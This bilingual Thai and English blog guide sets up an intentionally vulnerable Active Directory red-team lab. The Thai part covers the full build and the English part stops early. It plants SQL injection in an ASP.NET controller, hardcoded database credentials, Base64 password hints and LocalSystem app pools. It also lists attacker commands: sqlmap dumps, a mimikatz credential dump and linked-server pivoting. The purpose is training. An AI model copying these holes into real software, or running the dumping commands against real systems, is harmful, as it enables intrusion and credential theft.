---
title: How to set Active Directory Home Labs for Red Teaming [TH/EN]
published: 2025-11-15
description: "How to set Active Directory Lab for Red Teaming"
tags: ["Home Labs","Red Teaming"]
category: Home Labs
draft: false
---
# ENGLISH BELOW

# Active Directory Lab Setup

## 0) Network Topology (VMware)

**เป้าหมาย**
- เครือข่ายภายใน: 10.10.20.0/24 (NAT/Host-Only)
- เปิดจาก “ภายนอก” เฉพาะ Web (HTTP/HTTPS) ที่ **WEB01** 
- การเข้าถึง **DC01/DB01/DB02/Client01** ต้องทำ **SSH/Proxy Tunnel** ผ่าน **WEB01** เท่านั้น

**กำหนด IP ภายใน:**
- DC01 = **10.10.20.2/24**, Gateway = 10.10.20.1, DNS ชี้ตัวเอง (10.10.20.2)
- DB01 = **10.10.20.54/24**, DNS = 10.10.20.2
- DB02 = **10.10.20.58/24**, DNS = 10.10.20.2
- WEB01 = **10.10.20.7/24**, DNS = 10.10.20.2
- Client01 = **10.10.20.100/24**, DNS = 10.10.20.2

**การตั้งค่า Network (VMware)**
- สร้าง Virtual Network Adapter ชื่อ **Sentinel7 (Int.) (Host-only)** โดยกำหนด Subnet `10.10.20.0/24`  
- เชื่อมต่อ **DC01/DB01/DB02/Client01** โดยใช้ NIC เดียว คือ **Sentinel7 (Int.) (Host-only)**  
- Machine **WEB01** ให้เชื่อมต่อ 2 NIC คือ
  - NIC1: **Sentinel7 (Int.) (Host-only)** เพื่อใช้ในการเข้าถึง AD/DB ภายใน
  - NIC2: **Bridged** เพื่อรับ IP จาก LAN จริง และเปิดเว็บออกภายนอก 

> **Lab บังคับให้ผู้ฝึกทำ Tunneling** โดยการตั้งค่า Inbound จากภายนอกไปที่ WEB01 เฉพาะ **Port 80/443** (Port ของ Web) และ **Port 22** (สำหรับทำ SSH Tunneling) เท่านั้น  
> และกำหนดให้บล็อกการเข้าถึงภายในทั้งหมด หากเชื่อมต่อจากภายนอก

---

## 1) Deploy VMs

- สร้าง VM: **DC01, DB01, DB02, WEB01** โดยใช้ Windows Server 2019 และ **Client01** ใช้ Windows 10
- ติดตั้ง OS ให้เรียบร้อย (ตั้งรหัสผ่านให้ปลอดภัย)

**ตั้ง IP ด้วย PowerShell:**
```powershell
# แทน <IF> ด้วยชื่อ Interface (เช่น "Ethernet")  
New-NetIPAddress -InterfaceAlias "<IF>" -IPAddress 10.10.20.2 -PrefixLength 24 -DefaultGateway 10.10.20.1  
Set-DnsClientServerAddress -InterfaceAlias "<IF>" -ServerAddresses 10.10.20.2
```
ให้กำหนด IP ใน VM อื่น ๆ ในแนวเดียวกัน และส่วน WEB01 ให้ตั้งทั้ง 2 NIC: NIC-Internal = 10.10.20.7/24, NIC-Bridged

---

## 2) ตั้ง DC01 (AD DS + DNS + ADFS) และ Promote Domain

**บน DC01 (ใช้ PowerShell แบบ Run as administrator):**
```powershell
# 2.1 เปลี่ยนชื่อ
Rename-Computer -NewName "SENTINEL7-DC" -Restart
```
จากนั้น Reboot และ Login ใหม่อีกครั้ง

```powershell
# 2.2 ติดตั้ง Role
Install-WindowsFeature AD-Domain-Services, DNS, ADFS-Federation -IncludeManagementTools
```

```powershell
# 2.3 โปรโมตเป็น Domain Controller (Forest ใหม่ sentinel7.local)  
Install-ADDSForest `
  -DomainName "sentinel7.local" `
  -DomainNetbiosName "SENTINEL7" `
  -SafeModeAdministratorPassword (Read-Host -AsSecureString "DSRM Password") `
  -InstallDns `
  -Force
```
ให้กำหนด DSRM Password และ Reboot 1 รอบ

**ตรวจสอบหลังขึ้น DC:**
```powershell
Get-ADDomain
Get-Service DNS
```

> *ADFS ติดตั้ง Role ไว้จะต้องใช้ SSL Cert/ชื่อบริการเพิ่ม ถ้าไม่ใช้สาารถเว้นไว้ได้

---

## 3) DNS ภายใน + Users/Groups + Join Domain

### 3.1 DNS A Records (ทำบน DC01)
ชี้ **WEB01 (10.10.20.7)** ให้กับ
- `intranet.sentinel7.local`
- `dev.env.intranet.sentinel7.local`

```powershell
Add-DnsServerResourceRecordA -ZoneName "sentinel7.local" -Name "intranet" -IPv4Address 10.10.20.7  
Add-DnsServerResourceRecordA -ZoneName "sentinel7.local" -Name "dev.env.intranet" -IPv4Address 10.10.20.7  
Resolve-DnsName intranet.sentinel7.local  
```

### 3.2 Populate AD (บน DC01)
ตัวอย่างสคริปต์สร้าง OU/Groups/Users และใส่สมาชิก:
```powershell
Import-Module ActiveDirectory

# --- OU ---
$domainDN = "DC=sentinel7,DC=local"
if (-not (Get-ADOrganizationalUnit -LDAPFilter '(ou=Sentinel Users)' -SearchBase $domainDN -ErrorAction SilentlyContinue)) {
    New-ADOrganizationalUnit -Name "Sentinel Users" -Path $domainDN -ProtectedFromAccidentalDeletion $false
}
if (-not (Get-ADOrganizationalUnit -LDAPFilter '(ou=Sentinel Groups)' -SearchBase $domainDN -ErrorAction SilentlyContinue)) {
    New-ADOrganizationalUnit -Name "Sentinel Groups" -Path $domainDN -ProtectedFromAccidentalDeletion $false
}

# --- Groups ---
if (-not (Get-ADGroup -LDAPFilter '(cn=NCIT-User)' -SearchBase "OU=Sentinel Groups,$domainDN" -ErrorAction SilentlyContinue)) {
    New-ADGroup -Name "NCIT-User" -GroupScope Global -Path "OU=Sentinel Groups,$domainDN"
}
if (-not (Get-ADGroup -LDAPFilter '(cn=DB-Admins)' -SearchBase "OU=Sentinel Groups,$domainDN" -ErrorAction SilentlyContinue)) {
    New-ADGroup -Name "DB-Admins" -GroupScope Global -Path "OU=Sentinel Groups,$domainDN"
}

# --- Users ---
$users = @(
  @{Given="Din";   Surname="Napas"; Sam="din.na";   Pwd="P@ssComplex1!"},
  @{Given="NCIT";  Surname="RTN";   Sam="ncit.rtn"; Pwd="SecureP@ss2#"},
  @{Given="Cyber"; Surname="Navy";  Sam="cyber.nav";Pwd="StrongKey3$"}
)

foreach ($u in $users) {
  $name = "$($u.Given) $($u.Surname)"
  $sam  = $u.Sam
  $upn  = "$sam@sentinel7.local"

  if (-not (Get-ADUser -Filter "SamAccountName -eq '$sam'" -ErrorAction SilentlyContinue)) {
    New-ADUser -Name $name `
      -GivenName $u.Given -Surname $u.Surname `
      -SamAccountName $sam -UserPrincipalName $upn `
      -Path "OU=Sentinel Users,$domainDN" `
      -AccountPassword (ConvertTo-SecureString $u.Pwd -AsPlainText -Force) `
      -Enabled $true -ChangePasswordAtLogon $false
  }
}

# --- Group membership ---
Add-ADGroupMember -Identity "NCIT-User" -Members "din.na","ncit.rtn","cyber.nav" -ErrorAction SilentlyContinue
Add-ADGroupMember -Identity "DB-Admins" -Members "din.na" -ErrorAction SilentlyContinue

# --- ใส่ Flag ใน Description ---
Set-ADUser -Identity "din.na" -Description 'Flag1: FLAG{AD-Flag-Here}'

```

### 3.3 Join Domain (บน Client01/DB01/DB02/WEB01)
ตั้งชื่อ + DNS ชี้ 10.10.20.2 แล้ว Join Domain ดังนี้
```powershell
Rename-Computer -NewName "SENTINEL7-DB01" -Restart
# แล้วตั้ง IP ตามข้อ 0  
Add-Computer -DomainName "sentinel7.local" -Credential "SENTINEL7\Administrator" -Restart
```
ทำซ้ำบน **DB02, WEB01, Client01** และแก้ชื่อให้ตรง

**ตรวจสอบหลังเข้าร่วมโดเมน:**  
บน DC01:
```powershell
Get-ADComputer -Filter * | Select Name,DNSHostName
```

---

## 4) เตรียม gMSA (DC01) และติดตั้งที่ DB01/DB02

### 4.1 KDS Root Key (บน DC01)
```powershell
Add-KdsRootKey -EffectiveTime (Get-Date).AddHours(-10)
```

### 4.2 สร้าง gMSA (บน DC01)
จะไม่เพิ่ม WEB01$ เพื่อคงช่องโหว่ไว้ (ต้องใช้ creds จาก config)
```powershell
New-ADServiceAccount -Name "gmsa_db01" -DNSHostName "SENTINEL7-DB01.sentinel7.local" `
  -PrincipalsAllowedToRetrieveManagedPassword "SENTINEL7-DB01$"
New-ADServiceAccount -Name "gmsa_db02" -DNSHostName "SENTINEL7-DB02.sentinel7.local" `
  -PrincipalsAllowedToRetrieveManagedPassword "SENTINEL7-DB02$"
```

### 4.3 ติดตั้ง gMSA บน DB01 และ DB02
รันใน cmd เพื่อขอสิทธิ์สูงสุด
```powershell
runas /user:SENTINEL7\Administrator "powershell.exe -NoExit"
```
บน **DB01**:
```powershell
Install-WindowsFeature RSAT-AD-PowerShell
Import-Module ActiveDirectory
Install-ADServiceAccount gmsa_db01
Test-ADServiceAccount gmsa_db01
```
บน **DB02**:
```powershell
Install-WindowsFeature RSAT-AD-PowerShell
Import-Module ActiveDirectory
Install-ADServiceAccount gmsa_db02
Test-ADServiceAccount gmsa_db02
```

---

## 5) ติดตั้ง SQL Server 2019 Express (DB01, DB02) + เปิด TCP/1433 + ตั้ง Service เป็น gMSA

> ติดตั้ง SQL Server Management Studio : https://go.microsoft.com/fwlink/?linkid=2257624&clcid=0x409 

**หลังติดตั้ง เสร็จแล้ว ปรับบริการให้ใช้ gMSA โดยไม่ต้องใส่รหัสผ่าน ดังนี้**

บน **DB01**:
```powershell
# เปลี่ยนบัญชี Service ของ SQL Express ให้ใช้ gMSA  
sc.exe config "MSSQL$SQLEXPRESS" obj= "SENTINEL7\gmsa_db01$" password= ""  
Restart-Service "MSSQL$SQLEXPRESS"
```

บน **DB02**:
```powershell
sc.exe config "MSSQL$SQLEXPRESS" obj= "SENTINEL7\gmsa_db02$" password= ""  
Restart-Service "MSSQL$SQLEXPRESS"
```
**หรือใช้ cmd ในการรันคำสั่งนี้ หากมีปัญหา**
บน **DB01**:
```powershell
cmd /c sc config "MSSQL$SQLEXPRESS" obj= "SENTINEL7\gmsa_db01$" password= ""
cmd /c sc qc "MSSQL$SQLEXPRESS" | find "SERVICE_START_NAME"
```
>"MSSQL$SQLEXPRESS" ให้ปรับตาม Instance ที่ตั้งไว้ตอนติดตั้ง เช่น "MSSQL$ชื่อที่ตั้งไว"

บน **DB02**:
```powershell
cmd /c sc config "MSSQL$SQLEXPRESS" obj= "SENTINEL7\gmsa_db02$" password= ""
cmd /c sc qc "MSSQL$SQLEXPRESS" | find "SERVICE_START_NAME"
```

**เปิด TCP/IP + กำหนด Port 1433**
> *สำหรับ SQL 2019 Express (MSSQL15.SQLEXPRESS) – ปรับตาม Instance จริง*

```powershell
# DB01  
New-Item -Path "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQLServer\SuperSocketNetLib\Tcp\IPAll" -Force | Out-Null  
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQLServer\SuperSocketNetLib\Tcp\IPAll" -Name "TcpDynamicPorts" -Value ""  
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQLServer\SuperSocketNetLib\Tcp\IPAll" -Name "TcpPort" -Value "1433"  
Restart-Service "MSSQL`$SQLEXPRESS"
```
ทำซ้ำบน **DB02**

**เปิด Firewall “อนุญาตจาก DB01 และบล็อกจาก Client01” **
```powershell
# บน DB02  
New-NetFirewallRule -DisplayName "Block SQL from Client01" -Direction Inbound -Protocol TCP -LocalPort 1433,1434 -Action Block -RemoteAddress 10.10.20.100  
New-NetFirewallRule -DisplayName "Allow SQL from DB01"   -Direction Inbound -Protocol TCP -LocalPort 1433,1434 -Action Allow -RemoteAddress 10.10.20.54  
New-NetFirewallRule -DisplayName "Allow SQL from WEB01"  -Direction Inbound -Protocol TCP -LocalPort 1433,1434 -Action Allow -RemoteAddress 10.10.20.7  

# บน DB01 (allow จาก WEB01)  
New-NetFirewallRule -DisplayName "Allow SQL from WEB01"  -Direction Inbound -Protocol TCP -LocalPort 1433,1434 -Action Allow -RemoteAddress 10.10.20.7  
```

**เปลี่ยนเป็น Mixed Mode (SQL + Windows Auth)**
รันใน **SSMS** ที่เชื่อมต่อ **(Local)** แต่ละเครื่อง:
```sql
EXEC xp_instance_regwrite  
  N'HKEY_LOCAL_MACHINE',  
  N'SOFTWARE\Microsoft\MSSQLServer\MSSQLServer',  
  N'LoginMode',  
  REG_DWORD, 2;  
```
แล้ว Restart Service
```powershell
Restart-Service "MSSQL`$SQLEXPRESS"  
```

---

## 6) ฐานข้อมูล + สิทธิ์ + Linked Server + Hints/Leaks

ตัวอย่างคร่าว ๆ
- บน **DB01** สร้าง **public_db**
- บน **DB02** สร้าง **secret_db**
- สร้าง Login/Users ตามต้องการ (เช่น `public_db_reader`) และทำ Linked Server จาก **DB02 ไปยัง DB01** (หรือทิศทางใดก็ได้)

**บน DB01 (สร้าง public_db + ผู้อ่าน + hint obfuscated + flag):**
```sql
CREATE DATABASE public_db;  
GO  
USE public_db;  
CREATE TABLE dbo.announcements(id int identity primary key, msg nvarchar(200));  
INSERT INTO dbo.announcements(msg) VALUES   
  (N'Welcome to Sentinel7 Intranet on sentinel7.local'),  
  (N'Contact din.na@sentinel7.local for IT support - Password hint: UEBzc0NvbXBsZXgxIQ=='),  -- Base64 of P@ssComplex1!  
  (N'NCIT-User group: din.na, ncit.rtn, cyber.nav - Hint for ncit: U2VjdXJlUEBzczIj'),  -- Base64 of SecureP@ss2# (redundancy)  
  (N'Flag2: Flag{DB-Flag-Here}');  -- Flag  

-- Login/USER (SQL creds ที่จะ leak ใน web config)  
CREATE LOGIN public_db_reader WITH PASSWORD = 'Str0ng!Pass'; 
CREATE USER public_db_reader FOR LOGIN public_db_reader;  
EXEC sp_addrolemember N'db_datareader', N'public_db_reader';  
```

**บน DB02 (สร้าง secret_db):**
```sql
CREATE DATABASE secret_db;  
GO  
USE secret_db;  
CREATE TABLE dbo.secret_notes(id int identity primary key, note nvarchar(200));  
INSERT INTO dbo.secret_notes(note) VALUES   
  (N'Top Secret Info'),  
  (N'Flag3: Flag{Secret-DB-Flag}');  -- Flag  
```

**Linked Server: DB02 ไปยัง DB01 (ใช้ SQL Login public_db_reader) และ reverse DB01 ไปยัง DB02 เพื่อให้สามารถทำ two-way exploit**

บน **DB02**:
```sql
EXEC master.dbo.sp_addlinkedserver
    @server     = N'LS_DB01_PUBLIC',
    @srvproduct = N'',
    @provider   = N'MSOLEDBSQL',
    @datasrc    = N'10.10.20.54,1433';  -- ใช้พอร์ตคงที่ที่ตั้งไว้
GO

EXEC master.dbo.sp_addlinkedsrvlogin
    @rmtsrvname = N'LS_DB01_PUBLIC',
    @useself    = 'false',
    @locallogin = NULL,
    @rmtuser    = N'public_db_reader',
    @rmtpassword= N'Str0ng!Pass';
GO

-- ตรวจสอบว่า Linked Server ถูกสร้างจริง
SELECT server_id, name, product, provider, data_source
FROM sys.servers
WHERE name = N'LS_DB01_PUBLIC';
GO

-- ทดสอบดึงข้อมูล
SELECT *
FROM OPENQUERY(LS_DB01_PUBLIC, 'SELECT TOP 5 * FROM public_db.dbo.announcements');

```

บน **DB01** (Reverse Link):
```sql
EXEC master.dbo.sp_addlinkedserver
    @server     = N'LS_DB02_SECRET',
    @srvproduct = N'',
    @provider   = N'MSOLEDBSQL',
    @datasrc    = N'10.10.20.58,1433';  -- ใช้พอร์ตคงที่จากขั้นตอน DB02
GO

EXEC master.dbo.sp_addlinkedsrvlogin
    @rmtsrvname  = N'LS_DB02_SECRET',
    @useself     = 'false',
    @locallogin  = NULL,
    @rmtuser     = N'public_db_reader',
    @rmtpassword = N'Str0ng!Pass';
GO

-- (ออปชัน) เปิด RPC OUT ถ้าจะใช้ EXEC AT ... หรือสี่พาร์ตเนมแบบมีพารามิเตอร์
EXEC master.dbo.sp_serveroption N'LS_DB02_SECRET', N'rpc out', N'true';
GO

-- ตรวจสอบว่าถูกสร้างจริง
SELECT server_id, name, product, provider, data_source
FROM sys.servers WHERE name = N'LS_DB02_SECRET';
GO
```

ทดลองการดึงข้อมูลจาก DB01
```sql
-- ดึงข้อมูล
SELECT * FROM OPENQUERY(LS_DB02_SECRET, 'SELECT TOP 5 * FROM secret_db.dbo.secret_notes'); 
-- เช็ค identity ฝั่งปลายทาง (ช่วยดีบักสิทธิ์/บริบท) 
SELECT * FROM OPENQUERY(LS_DB02_SECRET, 'SELECT DB_NAME() AS dbname, SUSER_SNAME() AS whoami, SYSTEM_USER AS sysuser');
```
**หมายเหตุ** หากมี Error ขึ้นตามด้านล่าง
```sql
Msg 18456, Level 14, State 1, Line 1 Login failed for user 'public_db_reader'.
```

ให้แก้ไข ดังนี้
บน **DB02**:
- ตรวจสอบว่ามี login อยู่จริง และสถานะไม่ถูกปิด
```sql
SELECT name, is_disabled, create_date, modify_date
FROM sys.sql_logins
WHERE name = 'public_db_reader';
```

- ถ้าไม่มีหรือพาสเวิร์ด/ลืม ให้สร้าง/รีเซ็ตพาสเวิร์ด
```sql
-- สร้างใหม่ (ถ้าไม่มี)
CREATE LOGIN public_db_reader WITH PASSWORD = 'Str0ng!Pass', CHECK_POLICY = ON;
-- หรือ รีเซ็ตพาสเวิร์ด (ถ้ามีอยู่แล้ว)
ALTER LOGIN public_db_reader WITH PASSWORD = 'Str0ng!Pass';
-- เปิดใช้งาน (ถ้าถูกปิด)
ALTER LOGIN public_db_reader ENABLE;
```

- ตรวจสอบว่ามี user ในฐานข้อมูล secret_db และมีสิทธิ์ SELECT บนตารางที่ต้องการ
```sql
USE secret_db;
-- ตรวจสอบ user mapping
SELECT dp.name AS db_user, dp.type_desc, dp.create_date
FROM sys.database_principals dp
WHERE dp.name = 'public_db_reader';

-- ถ้ายังไม่มี ให้สร้าง user แล้วมอบสิทธิ์
CREATE USER public_db_reader FOR LOGIN public_db_reader;
GRANT SELECT ON dbo.secret_notes TO public_db_reader;
```

- ตรวจสอบว่าเซิร์ฟเวอร์ยอมรับ SQL Authentication (Mixed Mode) ด้วย SSMS: Right-click server > Properties > Security > ตรวจว่า SQL Server and Windows Authentication mode ถูกเลือก


> **Restrict**: บน DB02 ให้ public_db_reader สิทธิ์ db_datareader เฉพาะ secret_db ถ้าต้องการ แต่คง vuln

---

## 7) WEB01: IIS + .NET Hosting + โฮสต์ Intranet/Dev + เปิดเข้า “จากภายนอก” + Leak Config **ใช้ XAMPP แทนได้**

**ติดตั้ง IIS + ส่วนที่แนะนำสำหรับ .NET:**
```powershell
Install-WindowsFeature Web-Server, Web-WebServer, Web-Common-Http, Web-Static-Content, Web-Default-Doc, Web-Http-Errors, Web-Http-Redirect, Web-App-Dev, Web-Asp-Net45, Web-Net-Ext45, Web-ISAPI-Ext, Web-ISAPI-Filter, Web-Mgmt-Tools -IncludeManagementTools  
```

**ติดตั้ง .NET Core Hosting Bundle**

**วางไฟล์เว็บ และเพิ่ม leak ใน config (สมมติ zip มี appsettings.json – ถ้าไม่มี สร้างให้สร้าง dummy)**
- แตก zip **prod** → `C:\inetpub\Intranet\wwwroot`
- แตก zip **dev**  → `C:\inetpub\DevIntranet\wwwroot`
- เพิ่ม appsettings.json ในทั้งสอง folder เพื่อ leak (ตัวอย่าง content) ดังนี้
```json
{  
  "ConnectionStrings": {  
    "PublicDb": "Server=10.10.20.54;Database=public_db;User Id=public_db_reader;Password=Str0ng!Pass;",  // Leak IP/creds  
    "SecretDb": "Server=10.10.20.58;Database=secret_db;User Id=public_db_reader;Password=Str0ng!Pass;"  // Leak for pivot  
  },  
  "DomainHint": "sentinel7.local",  // Leak domain  
  "DcIp": "10.10.20.2"  // Leak DC IP for redundancy  
}  
```
### 7.1 Vulnerability Setup
ถ้า zip prod/dev ไม่มี vuln จริง ให้สร้าง dummy .NET app (e.g., ASP.NET Core MVC) และเพิ่ม code vuln ใน controller (ตัวอย่างใน wwwroot/Controllers/HomeController.cs หรือ endpoint /api/announce) ดังนี้

```csharp
using Microsoft.AspNetCore.Mvc;  
using System.Data.SqlClient;  

[Route("api/announce")]  
public class AnnounceController : ControllerBase {  
    private readonly string _connectionString = "Server=10.10.20.54;Database=public_db;User Id=public_db_reader;Password=Str0ng!Pass;";  // จาก appsettings  

    [HttpGet]  
    public IActionResult GetAnnouncement(string id) {  
        using (SqlConnection conn = new SqlConnection(_connectionString)) {  
            conn.Open();  
            string query = "SELECT * FROM announcements WHERE id = '" + id + "'";  // Vulnerable SQLi  
            using (SqlCommand cmd = new SqlCommand(query, conn)) {  
                var result = cmd.ExecuteReader();  
                // Process result...  
                return Ok(result);  
            }  
        }  
    }  
}  
```
>**หมายเหตุ:** ช่องโหว่นี้ จะทำให้ผู้เล่น exploit ด้วย sqlmap -u "http://10.10.20.7/api/announce?id=1' -- " --dump เพื่อ dump tables/hints ได้

**สร้าง App Pools + Sites + Host Header + Wildcard Binding เพื่อ external access**
```powershell
Import-Module WebAdministration  

New-WebAppPool -Name "IntranetPool"  
Set-ItemProperty IIS:\AppPools\IntranetPool -Name managedRuntimeVersion -Value "v4.0"  
Set-ItemProperty IIS:\AppPools\IntranetPool -Name processModel.identityType -Value LocalSystem  # เพื่อ LPE vuln (run as system)  

New-WebAppPool -Name "DevIntranetPool"  
Set-ItemProperty IIS:\AppPools\DevIntranetPool -Name managedRuntimeVersion -Value "v4.0"  
Set-ItemProperty IIS:\AppPools\DevIntranetPool -Name processModel.identityType -Value LocalSystem  # เพื่อ LPE  

New-Website -Name "Intranet" -PhysicalPath "C:\inetpub\Intranet\wwwroot" -Port 80 -HostHeader "intranet.sentinel7.local" -ApplicationPool "IntranetPool"  
New-WebBinding -Name "Intranet" -IPAddress "*" -Port 80 -HostHeader "*"  # Wildcard for external  

New-Website -Name "DevIntranet" -PhysicalPath "C:\inetpub\DevIntranet\wwwroot" -Port 80 -HostHeader "dev.env.intranet.sentinel7.local" -ApplicationPool "DevIntranetPool"  
New-WebBinding -Name "DevIntranet" -IPAddress "*" -Port 80 -HostHeader "*"  # Wildcard  
```
>หมายเหตุ LPE: การตั้ง AppPool เป็น LocalSystem ทำให้ vuln RCE จาก web นำไปสู่ priv esc (เช่น dump lsass ด้วย mimikatz) หรือ ถ้าต้องการ secure ให้เปลี่ยนเป็น ApplicationPoolIdentity

**ทำให้เข้าถึงจากภายนอก**
- ถ้า **WEB01** มี **NIC-Bridged** ได้ IP บนเครือข่ายจริง ให้ **เปิดไฟร์วอลล์** รับเฉพาะ 80/443 และ 22
```powershell
New-NetFirewallRule -DisplayName "Allow HTTP"  -Direction Inbound -Protocol TCP -LocalPort 80  -Action Allow  
New-NetFirewallRule -DisplayName "Allow HTTPS" -Direction Inbound -Protocol TCP -LocalPort 443 -Action Allow  
New-NetFirewallRule -DisplayName "Allow SSH"   -Direction Inbound -Protocol TCP -LocalPort 22  -Action Allow  
```
- ถ้าอยากใช้ HTTPS ให้เพิ่ม Certificate (Self-Signed/CA) แล้วเพิ่ม binding ใน IIS
- ถ้าไม่ใช้ Bridged ให้ตั้ง **VMware NAT Port Forward** → Host 80/443 ไปยัง WEB01:80/443 แล้วทำ Port Forward บน Router ต่ออีกชั้น (กรณีต้องการจากอินเทอร์เน็ตจริง)

> **สำคัญ: ด้วย wildcard binding ผู้เล่น access http://WEB01_PUBLIC_IP ได้ทันที จะเห็น intranet/dev แต่ internal DNS สำหรับใช้สำหรับ enum

---

## 8) บังคับ Tunneling สำหรับการเข้าถึง “ภายใน”

เพื่อให้ **DC01/DB01/DB02/Client01** ถูกเข้าถึงได้เฉพาะผ่าน **Tunnel** ให้ใช้งาน **OpenSSH Server บน WEB01** เป็น Jump Host

**ติดตั้ง OpenSSH Server (WEB01):**
```powershell
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0  
Start-Service sshd  
Set-Service -Name sshd -StartupType Automatic  
New-NetFirewallRule -Name sshd -DisplayName "OpenSSH Server (sshd)" -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22  
```

**ตัวอย่างทำ Tunnel จากเครื่องภายนอก (Linux/Mac/WSL/Windows 10+ มี `ssh`)**
- **พอร์ตเฉพาะกิจ (Local Forwarding):**
```bash
# ส่งต่อ RDP ไป Client01, และ SQL ไป DB02 ผ่าน WEB01 (ใช้ creds จาก leak)  
ssh -N -L 13389:10.10.20.100:3389 -L 11433:10.10.20.58:1433 Administrator@<WEB01_PUBLIC_IP_OR_DNS>  
```
จากนั้น RDP ไป `localhost:13389`, และเชื่อม SQL SSMS ไป `localhost,11433`

- **SOCKS Proxy (เจาะเว็บเครื่องภายในได้หลายจุด)**:
```bash
ssh -N -D 1080 administrator@<WEB01_PUBLIC_IP_OR_DNS>
```
แล้วตั้ง Browser ให้ใช้ SOCKS at `127.0.0.1:1080`

> **บล็อกตรงอื่นทั้งหมดจากภายนอก** ตรวจสอบให้แน่ใจว่า Inbound Rules ที่ Public/Bridged ของ **WEB01** เปิดแค่ **80/443/22** และเครื่องอื่น ๆ ไม่มีนโยบายเปิดพอร์ตออกสู่ภายนอก

เพิ่ม Flag บน Client01 (desktop):
บน Client01: สร้างไฟล์ C:\Users\Administrator\Desktop\flag.txt ด้วย content "Flag4: Flag{Client-Flag-Here}" (หรือที่อื่น ๆ)

---

## 9) Quick Validation

- **DNS ภายใน** (บน Client01):
```powershell
Resolve-DnsName intranet.sentinel7.local  
Resolve-DnsName dev.env.intranet.sentinel7.local  
```
- **เว็บภายใน:** เปิด `http://intranet.sentinel7.local` จาก Client01
- **เว็บจากภายนอก:** เปิด IP หรือ DNS public ของ WEB01 (ควรเห็น site ด้วย wildcard)
- **Trust กับโดเมน**:
```powershell
Test-ComputerSecureChannel
```
- **ถ้า False ให้ใช้คำสั่ง**:
```powershell
Test-ComputerSecureChannel -Repair -Credential sentinel7\Administrator
```
- **gMSA ใช้งานได้** (บน DB01/DB02):
```powershell
Test-ADServiceAccount gmsa_db01
Test-ADServiceAccount gmsa_db02
```
หากพบ Error ให้ใช้คำสั่ง
```powershell
runas /user:SENTINEL7\Administrator "powershell.exe -NoExit"
```
แล้วรันคำสั่งบน PowerShell ที่มีสิทธิ์สูงสุด

- **SQL TCP/1433 เปิดแล้ว** (จาก DB01 → DB02):
```powershell
Test-NetConnection 10.10.20.58 -Port 1433  
```
- **Firewall Rule DB02 ทำงาน**: ลองจาก Client01 ping 10.10.20.58 ควร **ไม่ผ่าน** แต่จาก DB01 ควรผ่าน

### 9.1 Validation from Attacker Perspective
ในขั้นตอนนี้จะทดสอบว่าสามารถแก้โจทย์ได้ตามเป้าหรือไม่

- Scan WEB01: `nmap -p 22,80,443 <WEB01_PUBLIC_IP>` (ต้อง open)
- Access web: `curl http://<WEB01_PUBLIC_IP>` (ต้องห็น content intranet/dev ด้วย wildcard และสมมติ vuln SQLi ใน /api/announce?id=1)
- Exploit SQLi: `sqlmap -u "http://<WEB01_PUBLIC_IP>/api/announce?id=1" --dump` (dump public_db, ต้องเห็น announcements กับ hint obfuscated)
- จาก WEB01 shell (หลัง RCE): `type C:\inetpub\Intranet\wwwroot\appsettings.json` (ต้องเห็น leak IP/creds/DC IP)
- LPE example (ถ้า AppPool LocalSystem): โหลด mimikatz.exe แล้วรัน `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit` (dump creds เช่น Administrator:W3b@S3rv3r)
- Connect DB: `./sqlcmd.exe -S 10.10.20.54 -U public_db_reader -P Str0ng!Pass -Q "SELECT * FROM public_db.dbo.announcements"` (ต้องเห็น flag/hint)
- Pivot via linked: `./sqlcmd.exe -S 10.10.20.54 -U public_db_reader -P Str0ng!Pass -Q "SELECT * FROM OPENQUERY(LS_DB02_SECRET, 'SELECT * FROM secret_db.dbo.secret_notes')"` (ต้องเห็น secret flag)

---

## 10) หมายเหตุเรื่อง “Security Patch Recommendations

- **Restrict gMSA Usage / Install on WEB01** ถ้าต้องการ secure เพิ่ม `SENTINEL7-WEB$` เข้า` -PrincipalsAllowedToRetrieveManagedPassword` ของ `gmsa_db01/gmsa_db02` และ `Install-ADServiceAccount` บน WEB01 เพื่อให้เว็บต่อ DB ด้วย Integrated Security (ไม่ต้องมีรหัสใน `appsettings.json`) ใน Lab นี้ไม่ได้ทำขั้นตอนนี้ เนื่องจากจงใจให้เกิดช่องโหว่
- **Integrated Security:** ปรับ Connection String เป็นแบบ `Trusted_Connection=True;` หรือ `Integrated Security=SSPI;`
- **Restrict public_db_reader:** ให้สิทธิ์เฉพาะ DB `public_db` เท่านั้น อย่า map login นี้เข้า DB `secret_db` แต่ใน Lab ได้ map ไว้เพื่อให้เกิดช่องโหว่
- **Linked Servers:** ถ้าไม่จำเป็น **!!!ห้ามลิงก์!!!** Secret DB กับ Public DB เพื่อลด blast radius
- **ปิดช่องโหว่เว็บ:** จำกัดการเข้าถึง `DevIntranet` เช่น Basic Auth/IP Allowlist หรือไม่เปิดสู่ภายนอก แต่ Lab จงใจเปิดไว้เพื่อให้มีช่องโหว่

---

## 11) กลไก gMSA บน WEB01

- เครื่อง **SENTINEL7-WEB$** (Computer Object ใน AD) ขอ **TGT** จาก **KDC (DC01)**
- เมื่อแอป/SSMS บน WEB01 ต้องใช้ gMSA, WEB01 ใช้ TGT เรียก **KDS** เพื่อดึง “managed password” ของ `gmsa_db01$`
- จากนั้นจึงใช้ Ticket/รหัสนี้ทำ Kerberos/SSPI ไปยัง **DB01** โดย **ไม่ต้องมีรหัสในไฟล์**  
- SQL บน **DB01** ตรวจ Ticket และอนุญาตตามสิทธิ์ที่กำหนดไว้

---

# ENGLISH GUIDE

# Active Directory Lab Setup (English Translation)

## 0) Network Topology (VMware)

**Objective**
- Internal network: 10.10.20.0/24 (NAT/Host-Only)
- From the “outside”, only Web (HTTP/HTTPS) on **WEB01** is exposed
- Access to **DC01/DB01/DB02/Client01** must go through **SSH/Proxy Tunnel** via **WEB01** only

**Internal IP Assignments**
- DC01 = **10.10.20.2/24**, Gateway = 10.10.20.1, DNS = 10.10.20.2 (self)
- DB01 = **10.10.20.54/24**, DNS = 10.10.20.2
- DB02 = **10.10.20.58/24**, DNS = 10.10.20.2
- WEB01 = **10.10.20.7/24**, DNS = 10.10.20.2
